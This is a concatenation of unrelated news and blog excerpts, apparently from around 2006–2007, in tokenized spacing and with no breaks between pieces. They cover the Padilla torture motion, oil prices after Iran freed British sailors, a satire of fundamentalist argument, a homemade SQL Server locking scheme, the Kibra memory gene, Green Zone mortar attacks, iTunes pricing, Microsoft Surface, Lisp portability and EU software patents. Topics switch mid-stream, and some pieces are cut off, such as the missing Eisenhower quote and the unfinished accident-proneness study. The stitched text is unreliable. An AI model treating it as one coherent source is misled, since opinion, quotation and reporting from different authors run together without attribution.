This week , Judge Cooke is scheduled to rule on Padilla ’s motion to dismiss on the basis of the government ’s torture and abuse of Padilla while he was in pretrial military confinement .
It will be interesting to see if Judge Cook rules that that the military is also exempt from that part of the Bill of Rights that prohibits the federal government from inflicting cruel and unusual punishments on Americans and others suspected of terrorism .
Do n’t forget : José Padilla is an American citizen .
Thus , this case continues to hold ominous implications for the American people , especially when Judge Cooke ’s ruling is considered in conjunction with the ruling of the Fourth Circuit Court of Appeals that upheld the government ’s enemy - combatant designation for Americans as part of its war on terrorism .
That means that whatever the government has done — and continues doing to Padilla — and , for that matter , every other enemy combatant in its war on terror ,  — it has the authority to do to all Americans .
Judge Cooke ’s ruling is just one more confirmation of how civil liberties have soared to the top of importance in terms of federal infringements on our freedom .
Perhaps this is a good time to revisit the warning issued to the American people by President Dwight Eisenhower , who had served as supreme commander of Allied forces during World War II :

SAN FRANCISCO ( MarketWatch ) -- Crude - oil futures closed lower Wednesday after Iranian President Mahmoud Ahmadinejad said he would release 15 U.K .
Navy personnel being held captive by Tehran , apparently ending a diplomatic crisis that had raised investor concerns about oil supplies in the region .
The sailors boarded a British Airways flight from Tehran to London early Thursday , according to Associated Press .
But oil 's loss was modest , capped by gains in gasoline futures , which climbed by more than 4 % to close at a seven - month high after the U.S. Energy Department reported that supplies of the motor fuel dropped for an eighth week in a row .
Crude for May delivery finished down 26 cents at $ 64.38 a barrel on the New York Mercantile Exchange , recovering a bit from the pre-supply data release low of $ 63.60 -- its weakest intraday level since March 27 .
The contract lost 2 % of its value on Tuesday as traders began to unwind the risk premium built into prices during the crisis .
" As tensions ease , it is not surprising to see some of the risk premium leak from prices , " said Michael Fitzpatrick , an analyst at Fimat USA .
" But the Iranian nuclear situation has n't been unwound so there is still plenty to worry about , which is why we are inclined to think the market has a very limited downside scope , " he said in a note to clients .
May crude traded at $ 61.69 on March 22 , the day before Iran 's arrest of the British troops .
The contract peaked at a close of $ 65.94 on Monday -- a 6.8 % gain .
" Neither side was ever likely to do anything to interrupt the flow of oil from Iran , " said James Williams , an economist at WTRG Economics .
" All that you need to do in to understand the situation is pretend you are the president of Iran . -- if you stopped exporting your 2.5 million barrels per day of crude oil , you would lose about $ 150 million per day in revenue or $ 4.5 billion a month , " he explained in e-mailed comments .
" That is 30 % of the country 's GDP and puts it into an economic depression that makes the Great Depression look weak . "
And then pretend " you are the president of the U.S. and attacked or blockaded Iranian oil shipments , " he said .
" Even if all other oil from the Saudis , Kuwait , Iraq and UAE could get out of the Gulf .
That would drive prices to $ 100 and certainly lead to a U.S. recession just a year or so before the next elections . "
Oil prices had " climbed anyway because futures markets move on perceptions .
This happens whether or not the perception coincides with the reality , " Williams said .

Gasoline props up oil
At the same time , " the gasoline market has been hit hard by record gasoline demand during a time of dropping gasoline production , " said Phil Flynn , a senior analyst at Alaron Trading , in e-mailed commentary .
" Gas production in the U.S. has been well below average with refineries suffering through a very tough refinery maintenance season . "
" The drop in gasoline stocks might have even supported crude had it not been for the announcement that the British captives were to be freed , " said Williams .
May reformulated gasoline climbed by 4.4 % , or 8.77 cents , to end the session at $ 2.1054 a gallon .
It had traded as low as $ 2.006 before the supply data were released and traded as high as $ 2.11 afterward -- the contract 's strongest level since Sept.
1 .
May heating oil closed at $ 1.8644 a gallon , up 2.57 cents .
Motor gasoline supplies dropped 5 million barrels for the week ended March 30 , the Energy Department reported Wednesday .
It pegged total supplies at 205.2 million barrels , or 2.6 % below the level from a year ago .
Gasoline supplies have now fallen a total of 22 million barrels since the week ended Jan. 26 , according to the government data .
In contrast , the American Petroleum Institute , which has a different method of collecting its data , reported that gasoline supplies fell 440,000 barrels to total 202 million for last week .
" As soon as we see a good stock build in gasoline it could easily lead to a 25 - cent drop -- which would probably influence crude as well , " said Williams .
The average price for a gallon of regular gasoline has been climbing .
It last stood at $ 2.70 , up 8.8 % from a month ago , according to AAA 's Fuel Gauge Report .
Refinery utilization was unchanged at 87 % of capacity , according to the Energy Department Wednesday .
Crude - oil imports were up 613,000 barrels per day last week vs. the previous week to average more than 10.2 million barrels per day , the government data showed .
Total product supplies over the last four - week period averaged almost 21 million barrels per day , up 1.4 % from the same time a year ago .
Of that , motor - gasoline demand was up 1.7 % from the year - ago period to average almost 9.3 million barrels per day , and distillate - fuel demand averaged almost 4.4 million barrels per day , down 1.9 % from the same time a year ago , the data showed .
Meanwhile , crude supplies rose more than expected , up 4.3 million at 332.7 million , according to the Energy Department .
They 're still 2.8 % below the year - ago level .
The API posted a decline of 104,000 barrels to 335.2 million .
And distillate supplies , which include heating oil and diesel fuel , were unchanged at 118 million barrels in the latest week , the Energy Department said .
The inventories , which had dropped nearly 25 million barrels over the last nine weeks , stood 2.6 % below the year - ago level , the data showed .
The API said distillates climbed 455,000 barrels to total 119.7 million last week .
Iran softens stance
Iran 's Ahmadinejad used a news conference for the Persian New Year to announce that the British sailors would be released , easing concerns about supplies .
The announcement was not a major surprise ; the U.K. government had said earlier it believed that Iran would like an " early resolution " to the crisis .
The 15 sailors were seized by armed Iranian forces 13 days ago and charged with trespassing in Iranian waters .
The U.K. had insisted they were in Iraqi waters , patrolling under a United Nations mandate when they were captured .
Traders said the sudden resolution of the Iranian crisis and release of the British captives could cause a sharp selloff in the energy market , given the speed with which prices surged last week as the crisis unfolded .
But supply and demand fundamentals also point toward lower oil prices in the medium - term , as global oil markets are moving toward excess capacity , Royal Bank of Scotland economists said Wednesday .
Crude prices have risen by about 35 % since their January low below $ 50 a barrel , said RBS economist Thorsten Fischer .
That 's a " stark reminder of the short - term volatility of oil prices due to the imbedded risk premium , " he said in a note to clients .
" Excess capacity will make it easier for oil - consuming countries to find alternative sources of oil in the event of supply disruptions , " he said .
" It also makes it more tempting for OPEC members to cheat , that is , to produce above their allocated quotas , resulting in upward pressure on supply .
Both factors tend to reduce oil prices . "
At the same time , " the market will still factor in remaining political tension about the U.S. in Iraq , " said Anthony Sabino , a professor of law at St. John 's University , whose practice includes oil and gas law .
And it'll really focus in on " the coming of the summer driving season in the U.S. , which will raise prices yet again , and weather news about an expected harsh hurricane season , and new concerns over supply disruptions to the U.S. end - of - the - supply chain in the Gulf of Mexico , " he said .
Natural gas gains
Rounding out the action in the energy markets Wednesday , natural - gas futures edged higher , with the May natural - gas contract closing up 8.9 cents at $ 7.515 per million British thermal units .
The natural - gas market fell more than 3 % on Tuesday even after news that Colorado State University researchers was predicting a " much more active " than average 2007 Atlantic U.S. hurricane season .

How To Think Like a Religious Fundamentalist Tuesday , May 1 , 2007
Posted by Henry in anti-creationism
I have just discovered this seemingly ancient , yet ageless article on how to think like a religious fundamentalist .
Buried in a Web 1.0 style website , I decided to bring it to spotlight and submitted that page to Digg .
Do n’t you just love it when stumbling upon a germ like this ?
The opening statement is great :
Planning a career in online Christian fundamentalist apologetics ?
How about the exciting world of Young - Earth Creationism ?
Witnessing to , and debating with , atheists and other hellbound unsaved sinners on the internet can be hard work , so you need to familiarise yourself with the tried and tested methods used by fundies all around the world .
After completing this simple training course , the shadow of doubt will never again flicker across your mind whilst listening to the lies and deceptions of those ignorant infidels who disagree with your self - evident truths .
After all , that is what religious fundamentalism is about – being blinded by faith without any discourse to reason and rationality .
This how - to “ training course ” then starts with what I call the Fundy Rule 1 on inerrancy :
First and foremost , the Bible is the absolute , literal word of God.
Contrary to popular opinion , it contains none of the following : errors of any kind , contradictions or absurdities .
which I believe can be expanded to the Koran of Islam , as well as other holy scriptures , not just that of the Bible of Christianity .
Here comes Fundy Rule 2 which is on science :
There is but one measuring stick required to determine the truth of any claim – how it compares with Holy Scripture .
More precisely , how it compares with your personal reading of Scripture .
So , if some secular humanist scientists dare to dream up a theory ( or “ wild guess ” , as it is more accurately known ) that apparently conflicts with the teachings of the Bible , clearly these egg - head mad professors have made yet another idiotic mistake , possibly under demonic influence .
How do we know they are mistaken ?
See “ 1 Inerrancy ” .
Here comes my favourite – how to debate and reason against attacks on fundamentalist thinking .
While I do n’t claim myself as being particularly analytical and intelligent , and definitely not a fan on belittling people ’s mistakes and intelligence – but , time and time again , we come across totally ignorant and utterly bewildering stupid arguments put forward by religious fundies .
So this training course has it , with Fundy Rule 3 on how to debate like a fundy :
Self Contradiction – the Bible stands correct at all time ;
Logic and Reason – just the playthings of the unbeliever – faith in the Lord is all that is needed ;
Burden of Proof on the Skeptic – the unbeliever claim God does not exist – ask them to disprove that ;
Repeating Yourself ;
Reply with Huge Answers ;
Grammar and Spellings – not important , as long as the Holy Spirit guides us ;
Knowledge – there is no need to know anything science offers us – all the evidence in the world is no match for a single grain of the True Faith ;
Definition of Words – the Spirit will guide us through if unbelievers say we are mistaken with words ;
Furthermore , the training course provides the last of priceless rules , Fundy Rule 4 – performing mental gymnastics .
Here is :
Lying for Jesus – being economical with the truth , making up data on the spot and ignoring conflicting evidence are all handy weapons to save souls ;
Compartmentalisation – keep scriptural knowledge away from the secular knowledge that allows you to function in worldly matters ;
Wilful ignorance – Ignorance is bliss , and what is more blissful than reading the Word Of God ?

Poppy Bush and James Baker gave Sonny the presidency to play with and he broke it .
So now they ’re taking it back .
They are dragging W. away from those reckless older guys who have been such a bad influence and getting him some new minders who are a lot more practical .
In a scene that might be called “ Murder on the Oval Express , ” Rummy turned up dead with so many knives in him that it ’s impossible to say who actually finished off the man billed as Washington ’s most skilled infighter .
( Poppy ?
Scowcroft ?
Baker ?
Laura ? Condi ?
The Silver Fox ?
Retired generals ?
Serving generals ?
Future generals ?
Troops returning to Iraq for the umpteenth time without a decent strategy ?
Democrats ?
Republicans ?
Joe Lieberman ? )
The defense chief got hung out to dry before Saddam got hung .
The president and Karl Rove , underestimating the public ’s hunger for change or overestimating the loyalty of a fed - up base , did not ice Rummy in time to save the Senate from teetering Democratic .
But once Sonny managed to heedlessly dynamite the Republican majority — as well as the Middle East , the Atlantic alliance and the U.S. Army — then Bush Inc. , the family firm that snatched the presidency for W. in 2000 , had to step in .
Two trusted members of the Bush 41 war council , Mr. Baker and Robert Gates , have been dispatched to discipline the delinquent juvenile and extricate him from the mother of all messes .
As programmers , we derive satisfaction from our ability to create solutions to other peoples ' problems .
Unfortunately , the problems that we solve are n't the exciting " world - hunger " type , they 're more along the lines of , " Sally is spending too much time doing expense reports and would like to automate the process . "
The inherently boring nature of these business problems lead many programmers to seek out new problems to solve , the most common of which is the meta - problem : a problem with the process of creating a solution for the actual problem .
The solutions to meta - problem take on many forms : NIH ( Not Invented Here ) , IHBLRIA * ( Invented Here , But Let 's Reinvent It Anyway ) , The Inner - Platform Effect * , and so many others .
Every once in a very rare while ( as of yesterday , only seventeen times in the history of all software development ) , the existing development tools are not adequate in solving the immediate problem and the solution to the meta - problem is actually beneficial to the overall solution .
Today 's example , courtesy of Robert Rossney , is not one of the seventeen .
The original programmer behind a SQL Server - based financial application that Robert has come to maintain discovered a meta- problem in the development process : if two or more database operations occurred simultaneously , the results of those operations would be completely unpredictable .
The operations were reading from and changing the same set of data , meaning that , when one operation a retrieved a value from the database , by the time it made a decision based on that value , the original value was changed by the other operation .
Now before all you database developers scream " Use Built - in Transactions ! , " let me remind you that there are a whole lot of problems associated with built - in database transactions .
First and foremost , they 're built - in and using them would give programmers one less meta - problem to solve which would increase the boring factor by at least three .
Secondly , built - in transactions ... uh ... -- okay , so that 's the only problem I can think of right now .
But it was big enough for Robert 's predecessor to develop his own transactional logic .
His transactional system was built on top of SQL Server 2000 and involved using a table called db__locks which had a row for each table in the database and contained the table 's name and a lock level of 0 ( not locked ) or 1 ( exclusively locked ) .
Obviously , he had big expansion plans for the future .
Code to wait , lock , and unlock is scattered across countless stored procedures .
Following is an example of this code , from the start of the stored procedure that updates various tables based on what 's in the General Ledger .
-- Wait for lock WHILE @LockLevel <> ' 0 ' BEGIN SELECT @LockLevel = LockLevel FROM db__Locks WHERE LockTbl = ' GL_Operations ' IF @ LockLevel <> ' 0 ' WAITFOR DELAY ' 00:00:01 ' END -- Set lock UPDATE db__Locks SET LockLevel = ' 1 ' WHERE LockTbl = ' GL_Operations ' ... snip whole bunch of code ... -- Clear lock UPDATE db__Locks SET LockLevel = ' 0 ' WHERE LockTbl = ' GL_Operations '
Fun fact : this transactional system comes with an admin utility to reset the db__Locks table if needed .
Another fun fact : on - call developers use this utility fairly often in the middle of the night when they 're woken up by a support call
* I would have linked to the Wikipedia for these anti-patterns , but for some reason , there 's no article on them .
I assume everyone was just too busy contributing to the thirteen - page article dissertation on the Chocobo , the fictional bird from the Final Fantasy video game series .
number of Cognitive Labs users in Arizona : >100,000
Researchers at the Translational Genomics Research Institute ( TGen ) have discovered a gene that plays a significant role in memory performance in humans .
The findings , reported by TGen and research colleagues at the University of Zurich in Switzerland , Banner Alzheimer 's Institute , and Mayo Clinic Scottsdale , appear in the October 20 issue of Science .
The study details how researchers associated memory performance with a gene called Kibra in over 1,000 individuals -- both young and old -- from Switzerland and Arizona .
This study is the first to describe scanning the human genetic blueprint at over 500,000 positions to identify cognitive differences between humans .
" Using the latest whole - genome association technologies , we have shed light on the fundamental biological process of human memory performance , " said Dr. Dietrich Stephan , Director of TGen 's Neurogenomics Division and a senior author of the paper .
" The capacity to remember is a defining feature of humans and we can now use this new understanding to develop drugs that will improve memory function .
" Researchers at the University of Zurich , collaborating with colleagues at Arizona 's Banner Alzheimer 's Institute , Mayo Clinic Scottsdale , and the Arizona Alzheimer 's Consortium , collected DNA samples from cognitively healthy people and measured memory performance .
TGen researchers screened the collected DNA samples using the whole - genome microarray technology .
Researchers then combined the scan data with the memory performance test results and found a connection between Kibra and memory .
According to the study 's lead author , Dr. Andreas Papassotiropoulos , professor at the University of Zurich , " The link between Kibra and memory could lead to new treatments for memory loss and possibly help improve memory in patients with memory disorders such as Alzheimer 's disease .
"
Not only did the research team identify that the Kibra gene was associated with memory performance , but they also showed that the gene is turned on in the hippocampus , a brain region known to be critical to memory function .
" Using sophisticated functional brain imaging techniques , we showed that individuals who had a version of the gene that is related to poorer memory potential had to tax their brains harder to remember the same amount of information , " said Dr. Dominique de Quervain , professor at the University of Zurich .
" Researchers now have enough of the ' letters ' to read the ' genetic book of life ' with unprecedented power , " said Dr. Eric Reiman , executive director of the Banner Alzheimer 's Institute and one of the study investigators .
" We 're excited about the chance to identify a gene that accounts for some of variation in normal human memory and to use this information in the discovery of promising new memory - enhancing treatments .
" Until now , researchers did not have access to the high - density technology to examine the genetic components associated with memory performance .
The team at TGen used Affymetrix Human Mapping 500K Arrays to simultaneously analyze 500,000 genetic markers from the people who were tested .
They made the memory discovery by comparing the genetic blueprint of people with good memory to people with poor memory ; memory performance was based on a series of gold - standard tests for all individuals .
The researchers then validated their discovery by replicating the Kibra gene finding in two separate and distinct groups of subjects .
" This memory study is a perfect example of how the use of advanced technologies in human genetics yields fundamental discoveries , " said Dr. Stephen P.A. Fodor , Chairman and CEO at Affymetrix , the Santa Clara , Calif . - based manufacturer of the technology .
The impact of the study is that it gives the research community a new and important handhold into truly understanding the process of memory .
The ramifications of this report are ultimately developing new and effective medicines that can combat memory loss , and that might also help improve memory in people with memory disorders like Alzheimer 's disease .
The team has already begun working on new drugs to restore memory function in age - related memory loss and diseases that have a memory loss component .
you have nothing between June 1 and 14 Oct 2004 .
I can vouch that between July 20th and October 14th ... we had Mortars come in almost every single day .
One day we had something like 30 and the following evening another 10 .
In the entire month of September 2004 , everyone put on their vests at 1830 ecause the rounds started coming in around 1900 to 1930 every night .
On October 14 [ 2004 ] the Turkish embassy was bombed , and one person died .
Mortar attacks on the Green Zone , until recently unheard of , were suddenly on the rise .
How common are rocket and mortar attacks on the Green Zone ?
Far more common than the impression given by the establishment media .
When I first created this blog entry I wondered whether or not the source of my statistics , the english - speaking establishment media for the most part , were effectively reporting on .
I 'm aware , for example , that Iraq Body Count 's excess death inventory , based on similar sources , significantly under reports the actual figure , now estimated by independent sources to be about one million
My concern has been echoed in a comment by " Contractor " to this blog entry .
He suggests that this blog entry significantly under -reports the actual cases of Green Zone attacks :
He continues ... " Contractor 's " experience is verified in a November 2004 Atlantic Monthly piece by William Langewiesche .
Langewiesche writes :
He continues ,
There was talk of " sleepers " in the slums on the inside [ of the Green Zone ] .
Even the Iraqis working for the CPA were suspect .
Palace defenses , already strong , were made stronger still , so that the Palace became the Green Zone 's Green Zone , as it remains today .
A " town hall " meeting was called to allay fears , but it had the opposite effect .
Work was disrupted .
Mortars and rockets came in every night now , almost all of them falling into the Green Zone 's open spaces .
One of the biggest rockets landed in the Palace parking lot and took out twenty - six cars , mostly SUVs .
Like the bombings in the city , the mortaring of the Green Zone occurred in distinct phases over time , whether in the mornings , or evenings , or late at night .
Rockets were relatively rare .
But the mortar attacks were so predictable at any given time that people working in the safety of the heavy - roofed Palace had office pools going on when the rounds would come in .
Meanwhile in Baghdad , the U.S. embassy has ordered all staff to wear flak jackets and helmets while outdoors in the Green Zone .
The order comes following a wave of recent rocket attacks .
The Green Zone is one of Iraq ’s most heavily - guarded areas .
four Filipino contractors working for the American government are killed in a rocket attack .
according to the HeraldNet
Langewiesche gives more insight with several more comments about mortar attacks , like the following : So , how common are attacks on the Green Zone ( AKA International Zone ) in Iraq .
According to Charles Gibson of ABC News , as of May 19 , the Green Zone has been attacked 64 times since the surge began ( 64 attacks in 12 weeks ) . [ 1 ]
It 's not clear whether this meansorMy on - going count identifies 29 days in which the Green Zone was attacked since October 2003 , tallied below .
( obviously , an under estimate ) .
We just heard of another one during Blair 's visit .
We heard that a " blast in Baghdad struck about 6:25 p.m. , just half an hour before Cheney 's wrap - up news conference .
It appeared to strike in the vicinity of the heavily fortified Green Zone . " [ 2 ]
According to a GlobalSecurity article on the Green Zone , the first attack on it was October 27 , 2003 , when three rockets were shot at the Al - Rashid hotel in which Deputy Defense Secretary Paul Wolfowitz was staying .
We hear about these notable attacks when a major dignitary visiting .
What about the attacks that occur when a dignitary is n't visiting ?
( Not commonly reported , at least mortars and rocket attacks ) .
I include videos of the April 12 , 2007 cafeteria bombing and a car bombing in a recent blog entry , How Long Can US Hang on in Iraq ?
In that essay I quote former CIA analyst and White House briefer , Ray McGovern , saying the US wo n't be able to hold onto it 's bases in Iraq for more than a year or two .
Another sign of the erosion of Green Zone security was included in a May 10 , 2007 DemocracyNow !
headline news piece :
The new order came after a May 3 mortar assault that killed four foreign US embassy workers .
The attack was at least the third straight day the Green Zone was attacked , according to HeraldAside from being a foreign occupying force , walling itself off from an increasingly dismal Iraqi society , the US has a another disadvantage in selecting the Green Zone location .
It housed Saddam Hussein 's main presidential palace prior to the 2003 invasion , thus representing a psychological symbol to some of the attackers .
October 27 , 2003 , Al - Rashid Hotel hit while Paul Wolfowitz was visiting .
Considered the first attack on the Green Zone according to GlobalSecurity article .

Colbert : GOP Rep. believes drug slang is ' foreign language '
David Edwards and Nick Juliano
Published : Friday May 4 , 2007 Print This Email This
Stephen Colbert's " 434 - part " Congressional profile " Better Know a District " stopped just outside the nation 's capital yesterday for an interview with Rep.
Tom Davis , who represents northern Virginia .
Davis ' district happens to be the home of Doobie Brothers drummer John " Tiny " Hartman , which prompted the following from Colbert :
" Are you familiar with what a doobie is , " Colbert asked .
" It 's the same thing as a dutchie , ganja , spleef , chronic . "
" That 's a foreign language to me , " Davis cut in .
" We have 120 foreign languages in Fairfax County spoken in our schools . "
" Oh , they 're speaking this in your schools , " Colbert quipped .
" I guarantee . "

Apple Computer on Monday revealed it had renewed contracts with the four largest record companies to sell songs through its iTunes digital store at 99 cents each .
The agreements came after months of bargaining , and were a defeat for music companies that had been pushing for a variable pricing model .
The music industry ’s big four - Universal , Warner Music , EMI and Sony BMG – were not immediately available to comment .
Since iTunes ’ launch three years ago , Apple has charged US consumers 99 cents for each track – a uniform price that Steve Jobs , its chief executive , favours because of its simplicity for consumers .
Edgar Bronfman , Warner ’s chief executive , and senior executives at EMI and Sony have in recent months supported variable pricing , which would allow them to charge more for new material from top artists .
Universal has taken a more modest approach , suggesting that the market should be allowed to develop further before any adjustments are made .
The issue has occasionally become acrimonious , with Mr Jobs last year publicly labelling the industry “ greedy ” .
However , several music executives privately acknowledge that they have little leverage over Mr Jobs .
ITunes accounts for about 80 per cent of the US digital music market at a time when the record companies are desperate to show shareholders they are replacing declining compact disc sales with new internet revenues .
“ The labels need Apple too much right now , ” one record executive said .
Online music sales surged 194 per cent last year to 352 m units , according to Nielsen Soundscan , as overall album sales fell 3.9 per cent .
Digital sales now account for about 5 per cent of the music majors ’ revenues .
The surge underlines the competing priorities for Apple and the music industry .
While the record companies are seeking new ways to generate revenues , Apple generates the bulk of its music - related revenues from sales of iPod players .
Some record executives had speculated that the big labels might sign short - term contracts with Apple and revisit the issue later .
The companies were also discussing issues such as anti-piracy controls and the possibility of greater interoperability between iTunes and other download services .
I was struck by a comment in Steve Yegge 's not - so - new blog :
How could you have arrived at [ the conclusion that top tech companies do a good job at interviewing ] after reading this blog entry ?
Did you read a different post than the one I wrote ?
I said interviewing is a terrible mess , and 10 % of all interviewers ask the same ridiculous questions to every candidate year in and year out , and I 'm not a fan of interviewing the way it 's practiced in our industry , on account of it being a " crapshoot " , and that even good engineers can wind up not getting offers [ because of the inherent randomness and poor selection power of the process most places use . ]
I 've often been accused of repeating myself .
But I firmly maintain that there is absolutely no shame in repeating yourself .
In fact , you should be repeating yourself .
And here 's why .
At any given time , only a fraction of the people listening to you will really hear what you 're saying .
If you repeat your message a few times in different ways , you increase the odds of getting your message across .
Now , that does n't mean that you should pound on the table and state the same sentence five times :
I understand the value of repetition .
I understand the value of repetition .
I understand the value of repetition .
I understand the value of repetition .
I understand the value of repetition .
Mechanical repetition is n't helpful .
It does n't enhance understanding .
But covering the same topic using a variety of different viewpoints and resources definitely does .
To emphasize my point , I 'll just repeat a post I made to my Vertigo blog .
Seth Godin has an interesting insight about repetition :
Of course you 're listening .
You 're the one that 's sharing such valuable insight with the universe .
You 're busy talking about your product or your new book or your organization .
You walk into a meeting and there are four impatient people sitting around the table , urging you on , faster faster faster do n't waste our time .
So you assume that they 're getting it the first time .
They 're not .
Odds are , your very clear , very useful ideas are getting garbled in translation .
I 'll do a post on a topic , and people will trackback to it , announcing that I 've said something quite different .
I double check my riff to be sure I said what I meant to say , and yes , I did .
But they did n't hear me .
It 's so tempting to compress your ideas into the smallest possible space and assume that the text or the images or the design will carry the day .
But we know that repetition is essential .
The paradox is that the long stuff gets skipped .
The long stuff gets ignored .
Short books sell better , short commercials get more viewers .
So repetition becomes essential .
It 'll bore your biggest fans , but you can do that ( a little ) .
Sticking to ( and building on ) your story works if you do it over time .
I 've always felt that repetition helped me learn .
And I repeat myself to help others learn .
We 're often accused , as software developers , of writing solutions to the same problem over and over .
I do n't see this as repetition , but practicing the fundamentals :
The problem the Parelli's see in those trying to transition from skilled amateur to expert virtually always comes down to something from the fundamentals that they either never quite mastered , or that they forgot over time .
So , perhaps that 's one more thing the superior performers do better than the rest of us – they keep practicing the fundamentals .
This fits with the notion that experts practice things that are n't necessarily fun , which can include both the things they still do n't do well , AND the non-exciting basics .
Bert Bates ( my co-author ) is a blackbelt level go player , one of the best amateur players in the state .
But when a visiting expert – four belt levels above Bert – showed up at the local go tournament , Bert was surprised to see the guy reading a book on fundamental go problems that Bert had read much earlier in his learning .
The expert said , " I must have read this at least a hundred times .
My goal each time is to see how much more quickly I can solve all the problems in the book than I did the last time . "
I absolutely love practicing the fundamentals .
I can never get enough of Hello World , and I happily re-read Code Complete and The Pragmatic Programmer about once a year .
CUI BONO ?….
From our friends at EPI , here ’s our chart of the day .
It compares the current economic expansion with past economic expansions .
Basically , everything sucks .
GDP growth has been mediocre , employment growth has been terrible , and investment in equipment and software has been pitiful .
And of course , we already know that median wages have been completely flat .
The average worker has gained exactly nothing from five years of economic growth .
But guess what ?
One sector of the economy has gone like gangbusters : corporate profits .
Even skyrocketing executive pay has n’t been enough to make a dent .
Good times indeed .
If you ’re a corporation , that is .
If you ’re not , then not so much .
And if you think this is just a coincidence , you have n’t been paying attention .
The computer does away with the need for a keyboard
Designed to do away with the need for a traditional mouse and keyboard , users can instead use their fingers to operate the computer .
Also designed to interact with mobile phones placed on the surface , Microsoft says it will initially sell the unit to corporate customers .
These will include hotels , casinos , phone stores and restaurants .
' Multi - touch '
So - called " multi- touch " interfaces - which allow the user to move several fingers on a screen to manipulate data , rather than relying on a mouse and menus - have been making waves in tech circles for some time .
We envision a time when surface computing technologies will be pervasive , from tabletops and counters to the hallway mirror
Microsoft chief executive Steve Ballmer
One of the most hotly - awaited examples is Apple 's iPhone , which is scheduled to be released in June .
Hewlett - Packard has also been looking at expanding multi- touch technology , in addition to leading research scientists such as Jeff Han of New York University 's Courant Institute of Mathematical Sciences .
With a 30 - inch screen , Surface will initially sell for between $ 5,000 and $ 10,000 ( £ 2,525 -£ 5,050 ) .
However , Microsoft said it aimed to produce cheaper versions for homes within three to five years .
' Multi- billion dollar '
" We see this as a multi-billion dollar category , and we envision a time when surface computing technologies will be pervasive , from tabletops and counters to the hallway mirror , " said Microsoft chief executive Steve Ballmer .
Microsoft says small groups of people will be able to use each Surface machine simultaneously .
They will be first deployed in November in Sheraton hotels , Harrah 's casinos , T - Mobile stores , and numerous restaurants .
The computer giant has had a mixed record recently with new consumer products .
While its Xbox games console has been a success , its Zune music player continues to lag far behind Apple 's iPod .
This is a story of one fire which happened in a town near Moscow .
There are a lot of such wooden houses all over Russia .
These houses are for a few families and you may say only poor people live there but it ’s a big fraction of Russian families still live in such wooden old houses , without a hot water and gas supply .
And also if somebody is getting on fire then all the house is risking to be burned to ashes .
Also according to the comments you would be able to see how fast are Russian firemen .
On the picture above you can see the start of the fire .
None seem to care – none sees the fire so probably nothing special is going on , maybe some cooking .
6 minutes passed .
Now one can see some fire .
Seems that it is a fire going on .
We need to call the fire squad .
7 minutes .
The room is on fire .
People think about taking out the people that might be inside .
9 minutes .
People try to save the expensive electrical appliances from another room .
Somebody brought the fire extinguisher but gave up using it .
16 minutes .
The second store and the attic are already on fire .
Where are the firemen could you wonder but None wonders from these people , they know they should n’t wait for fire squad so fast .
21 minutes passed .
Somebody brought a guy from the burning room , he is poisoned with smoke , felt down and got some trauma .
22 minutes .
Half of the building is on fire .
Where are the firemen ?
23 minutes .
Fire is going on .
27 minutes .
Here they are .
But they are out of water .
Now they try to find the source for water .
There are no street fire hydrants in Russia so they try to get water source in nearby buildings .
36 minutes passed .
They try their best but still ca n’t to shut down the fire .
48 minutes .
It ’s getting better .
51 minutes passed .
Ambulance arrives to evacuate the guy and maybe others who was affected by fire .
1 hour 30 minutes .
Now more fire brigades arrived .
Probably just to see what ’s up .
Really who cares about old wooden buildings .

my long answer to a short question ..
Every Lisp program attempts to expand until it can run on all Lisp implementations .
Those programs which cannot so expand are replaced by those which can .
I do n't believe it 's possible to write a non-portable Common Lisp program that 's relevant to the free software community .
You can try , but you will fail .
Your program will either become portable or be replaced by one that is .
People have tried to write non-portable code .
SLIME was announced as " a CMUCL - specific clone of ILISP " but was ported in no time at all .
Ironically it has become one of the most portable Lisp programs around .
And now I think that this was inevitable .
SLIME became portable because people with other Lisps wanted to use it .
They ported it themselves , added new features , found bugs , made suggestions , wrote web pages , did lots of good stuff .
This was an intensely fun period of thriving joyous hackery .
How could we refuse to cooperate with all these hackers who would later become friends ?
If we 'd seriously tried to reject non-CMUCL code then the other guys would have made a superior fork and had the fun all to themselves .
Portability was inevitable .
But it 's not all roses .
We 've invested a lot of time in adding features and fine details for our Lisp of choice that most of our friends wo n't ever appreciate .
In some cases we 've felt moved to port these features to other Lisps that we do n't use , and I have mixed feelings about that .
I spent a few weekends working on the SBCL backend out of sheer horror at the way so many people were experiencing SLIME .
I wish instead that somehow we'd all experienced it in the same way automatically .
So I believe that the social reality is that important Common Lisp free software will always become portable , for better and for worse .
This begs a lot of questions : how can we exploit this fact of nature ?
is it a good thing or is it a bad thing ?
should we change it and if so then how ?
I do n't have ready answers to all of them but they 're very interesting to consider .
Some people have all the bad luck .
Whether you call them accident - prone , or just unfortunate , there ’s a group of people who really do have more mishaps than others .
Everyone seems to know a comic or tragic figure who tends to get into scrapes , but until now it has been hard to show whether they are genuinely more accident - prone than others .
To answer this question , Ellen Visser and colleagues at the University Medical Center Groningen in the Netherlands analysed the results of 79 studies which examined how prone people are to having accidents .
In all , the studies recorded the mishaps suffered …
It appears that the European Commission has had a sudden change of heart on the issue of software patents .
In its response ( Microsoft Word document ) yesterday to a question posed by a Polish European Parliament member , the EC said that the European Patent Office would not grant any more software patents and that any patents that have already been granted may now be challenged and overturned in court .
The EPO Patent Office would thus actually apply and be bound by a new unitary Community law with respect to Community patents .
Indeed , an important feature of the proposed Community patent system is the accession of the Community to the EPC .
Moreover , with respect to the particular cases mentioned by the Honourable Member , the draft Community Patent regulation confirms in its Article 28.1 ( a ) that patents granted for a subject matter ( such as computer programs ) , which is excluded from patentability pursuant to Article 52 EPC [ European Patent Convention ] , may be invalidated in a relevant court proceeding .
The issue of software patents has been a hot one in Europe over the past couple of years .
Originally introduced into the European Parliament in May 2004 , the software patent directive came under heavy fire from open source advocates and other groups opposed to the idea of granting patents for software .
At the time of the directive 's introduction , the European Patent Convention barred the patenting of software .
Despite that , a few patents had been granted as the result of lawsuits .
Backed by the likes of Apple , Microsoft , IBM , and HP , the patent directive followed a bumpy course in and around the European Parliament , seemingly approved at one point and shot down at another .
After the European Parliament rejected the software patent directive last July in a 648 - 14 vote , the EC decided to go ahead with its original plan anyway , and grant patents that made a " technical contribution " :
" The Commission maintains that , without the directive , patents on computerised inventions will continue being granted by national offices and the European Patent Office , " said the Commission in a statement .
" It [ the EPO ] does not grant ' software patents '  computer programs per se , algorithms or computer - implemented business methods  that make no technical contribution , " said the EC .
That decision cheered industry groups such as the European Information and Communications Technology Association , which believes that software patents are necessary to protect their innovations and keep them from being pilfered by others .
